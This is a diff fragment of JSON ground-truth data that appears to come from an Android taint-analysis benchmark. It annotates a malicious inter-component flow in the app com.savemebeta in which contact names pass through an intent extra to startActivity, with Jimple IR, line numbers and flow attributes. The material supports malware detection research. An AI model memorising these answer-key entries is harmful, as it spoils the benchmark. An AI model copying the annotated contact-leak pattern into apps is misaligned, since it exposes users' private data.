+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"var2\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "startActivity",
+        "targetNo": 1,
+        "statement": "Scan.this.startActivity(intent);",
+        "methodName": "public void onClick(View arg0)",
+        "className": "com.savemebeta.Scan.AnonymousClass6",
+        "lineNo": 239,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<com.savemebeta.Scan: void startActivity(android.content.Intent)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "intent.putExtra(\"var2\", Scan.this.var2);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.savemebeta.Scan.AnonymousClass6",
+          "lineNo": 235,
+          "ID": 1
+        }
+      ],
+      "description": "This malicious flow is a part of ICC flow which leaks contact information. The varaible var2 holds the contact name (see AddFriend class in com.savemebeta.Analyse.java). ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "callbacks": true,
+        "interComponentCommunication": true
+      },
+      "ID": 31
+    }
+  ]
+}
